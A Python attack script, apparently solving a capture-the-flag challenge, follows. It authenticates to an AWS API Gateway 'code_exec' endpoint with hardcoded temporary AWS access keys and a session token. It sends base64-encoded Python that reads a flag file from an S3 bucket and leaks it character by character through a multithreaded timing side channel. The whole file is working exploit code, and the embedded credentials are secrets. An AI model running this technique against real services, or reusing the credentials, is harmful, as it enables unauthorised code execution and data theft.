import base64
import requests
import time
import threading
import queue
from aws_requests_auth.aws_auth import AWSRequestsAuth

auth = AWSRequestsAuth(aws_access_key="ASIARYWSMSYIOLOPQDID",
                       aws_secret_access_key="fzVE7H2+LqCvSNDLNzb1qS7oNEgVmwUm6T4ykuhq",
                       aws_token="IQoJb3JpZ2luX2VjELf//////////wEaDGlsLWNlbnRyYWwtMSJIMEYCIQDbv8K6aDIK9hgYAX96Cy3KWnf1nV6CK4zSOHtFYxRSzwIhAO6mXPFjyZd+6TRZsMIwtXohzOCURYNPdJqLl/uzdiyQKrUCCCQQABoMMTIxNzc0MDUyODgwIgwgxonHTHHAlDodO9wqkgJx7w+jK4uqQZAWDUqG7wlZ0IGc+cypxmsZ2PuPd1TWtwFF4Vv0MaCadKDdi49HdvpTY7KA+FQDtpJWBk2gmHkf9xpvMK4F5py+qG0lY7UalW/0OBGBfU2xb7YGzxmZF9w2TpqAj7HBEP07bhqST0ViU2ODIvf+5NMbDHYnhoOsYk2E1OPadWGQrakz6poU2+kTlvpA0bNCpR8sVZ6nz7FddcgJJmREMSdYMr+WJ3L3GNbiXihQT6Bzf1+IyItX7pgfhD2xpRSTFuePD9PeWMr3ASGt8ZSaOQDNBORnDUytLPGAYwBFdQZpl30pBnHA8vUZFFiRDdNNMs/HmHBH1dpN+yVtCNn/QnibHS2z6kA+n2OsMIOjzNMGOpwBypSEq9f7dXcHc58gHPJwbsnXkYmhe3joODue97MM0EHT9q1Ts6mkhrhJkvcIFPIlIwa6dYuWLiKxkbh80fSCOYuEHmzqkrynYFofo/BOxZ93fx1HlLeZji+uXDVLq8Z4kVuUu5DMkOKqvoFFPtZmFneh8sbN3NBvBPxgFD+KoLEuLJJzmYmg0zLO/cCE8VaNNVrVtIGQGJw6FVw1",
                       aws_host='l8ssyaz69f.execute-api.us-east-1.amazonaws.com',
                       aws_region='us-east-1',
                       aws_service='execute-api')

url = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"

def test_char(pos, char):
    code = f"""
import urllib.request
import time

try:
    req = urllib.request.Request(
        'https://userd8a2f72fe43094e8.s3.us-east-1.amazonaws.com/flag.txt',
        headers={{'User-Agent': '[cloudfront.net/docs.html]'}}
    )
    response = urllib.request.urlopen(req, timeout=5)
    val = "SUCCESS: " + response.read().decode('utf-8')
except Exception as e:
    val = "ERROR: " + str(e)
    if hasattr(e, 'read'):
        val += " BODY: " + e.read().decode('utf-8')

c = chr({ord(char)})
if len(val) > {pos} and val[{pos}] == c:
    time.sleep(2.0)
"""
    encoded_code = base64.b64encode(code.encode('utf-8')).decode('utf-8')
    start = time.time()
    try:
        requests.post(url, json={"code": encoded_code}, auth=auth, timeout=5)
    except:
        pass
    elapsed = time.time() - start
    return elapsed > 1.5

def thread_worker(pos, charset, q):
    for c in charset:
        if test_char(pos, c):
            q.put(c)
            return

def get_ex():
    print("Extracting exception...", flush=True)
    length = 60
    res = [""] * length
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_:., /[](){}<>="
    
    for chunk_start in range(0, length, 10):
        chunk_end = min(length, chunk_start + 10)
        threads = []
        queues = []
        for pos in range(chunk_start, chunk_end):
            q = queue.Queue()
            t = threading.Thread(target=thread_worker, args=(pos, charset, q))
            t.start()
            threads.append(t)
            queues.append(q)
        for i, t in enumerate(threads):
            t.join()
            if not queues[i].empty():
                res[chunk_start + i] = queues[i].get()
        print(f"Progress: {''.join(res)}", flush=True)
    return "".join(res)

print("RESULT:", get_ex(), flush=True)
